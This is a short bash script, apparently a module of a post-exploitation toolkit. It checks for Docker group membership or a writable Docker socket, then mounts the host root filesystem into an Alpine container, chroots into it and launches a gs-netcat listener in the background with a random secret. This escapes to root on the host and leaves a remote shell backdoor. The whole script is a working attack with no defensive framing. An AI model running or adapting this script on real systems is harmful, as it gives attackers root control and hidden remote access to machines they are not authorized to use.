#!/bin/bash
source "$(dirname "$0")/00_common.sh"
M="docker"
info "Checking Docker..."
id|grep -q docker || [ -w /var/run/docker.sock ] || { result "$M" "skip" "No access" ""; exit 1; }
command -v docker &>/dev/null || { result "$M" "skip" "Not installed" ""; exit 1; }
s=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
docker run -v /:/mnt --rm alpine chroot /mnt sh -c "nohup gs-netcat -s '$s' -l -i &" 2>/dev/null && { result "$M" "success" "Escape" "$s"; exit 0; }
result "$M" "fail" "Failed" ""; exit 1
